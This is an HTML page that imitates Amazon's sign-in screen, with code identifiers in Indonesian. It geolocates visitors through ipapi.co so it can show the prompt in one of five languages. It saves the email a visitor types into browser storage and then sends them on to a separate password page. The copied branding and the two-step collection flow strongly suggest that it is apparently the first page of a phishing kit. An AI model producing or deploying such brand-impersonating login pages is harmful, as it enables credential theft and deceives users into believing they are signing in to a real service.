<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon — Sign In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .logo { margin: 10px 0 25px; text-align: center; }
        .logo span { font-size: 28px; font-weight: 700; color: #111; letter-spacing: -0.5px; }
        .kotak { width: 100%; max-width: 340px; border: 1px solid #ddd; border-radius: 4px; padding: 20px 26px; }
        h1 { font-size: 28px; font-weight: 500; margin-bottom: 10px; }
        label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 5px; margin-top: 18px; }
        input { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 3px; font-size: 14px; height: 36px; }
        input:focus { outline: none; border-color: #007185; box-shadow: 0 0 0 1px #007185; }
        .tombol { width: 100%; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; padding: 8px 10px; font-size: 14px; color: #0F1111; cursor: pointer; margin-top: 22px; font-weight: 500; }
        .tombol:hover { background: #f7ca00; }
        .pesan-error { color: #c40000; font-size: 12px; margin-top: 5px; display: none; }
        .garis { height: 1px; background: #e7e7e7; margin: 30px 0 20px; }
        .bawah { font-size: 12px; color: #555; text-align: center; margin-top: 30px; }
        .bawah a { color: #0066c0; text-decoration: none; margin: 0 6px; }
    </style>
</head>
<body>
    <div class="logo"><span>amazon</span></div>
    <div class="kotak">
        <h1 id="judul">Sign In</h1>
        <label id="lblEmail">Email or mobile phone number</label>
        <input type="text" id="email" autocomplete="username">
        <p class="pesan-error" id="errorEmail">Enter your email or mobile phone number</p>
        <button type="button" id="lanjut" class="tombol">Continue</button>
    </div>
    <div class="garis"></div>
    <div class="bawah">
        <a href="#">Conditions of Use</a> | <a href="#">Privacy Notice</a> | <a href="#">Help</a>
        <p style="margin-top:5px;">&copy; 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
const terjemahan = {
  en: { judul:'Sign In', lblEmail:'Email or mobile phone number', errorEmail:'Enter your email or mobile phone number', btn:'Continue' },
  id: { judul:'Masuk', lblEmail:'Alamat email atau nomor ponsel', errorEmail:'Masukkan alamat email atau nomor ponsel Anda', btn:'Lanjutkan' },
  ja: { judul:'ログイン', lblEmail:'メールアドレスまたは携帯電話番号', errorEmail:'メールアドレスまたは電話番号を入力してください', btn:'続ける' },
  zh: { judul:'登录', lblEmail:'电子邮箱或手机号码', errorEmail:'请输入电子邮箱或手机号码', btn:'继续' },
  th: { judul:'เข้าสู่ระบบ', lblEmail:'อีเมลหรือเบอร์โทรศัพท์', errorEmail:'กรุณากรอกอีเมลหรือเบอร์โทรศัพท์', btn:'ดำเนินการต่อ' }
};

async function deteksiBahasa() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const d = await res.json();
    const c = d.country_code || 'ID';
    if (['JP'].includes(c)) return 'ja';
    if (['CN'].includes(c)) return 'zh';
    if (['TH'].includes(c)) return 'th';
    if (['ID'].includes(c)) return 'id';
  } catch {}
  return navigator.language.startsWith('ja') ? 'ja' :
         navigator.language.startsWith('zh') ? 'zh' :
         navigator.language.startsWith('th') ? 'th' :
         navigator.language.startsWith('id') ? 'id' : 'en';
}

async function terapkan() {
  const b = await deteksiBahasa();
  const t = terjemahan[b] || terjemahan.en;
  document.getElementById('judul').textContent = t.judul;
  document.getElementById('lblEmail').textContent = t.lblEmail;
  document.getElementById('errorEmail').textContent = t.errorEmail;
  document.getElementById('lanjut').textContent = t.btn;
}
terapkan();

document.getElementById('lanjut').addEventListener('click', () => {
  const email = document.getElementById('email').value.trim();
  if (!email) {
    document.getElementById('errorEmail').style.display = 'block';
    return;
  }
  localStorage.setItem('email_pengguna', email);
  window.location.href = 'password.html';
});
document.getElementById('email').addEventListener('input', () => {
  document.getElementById('errorEmail').style.display = 'none';
});
</script>
</body>
</html>
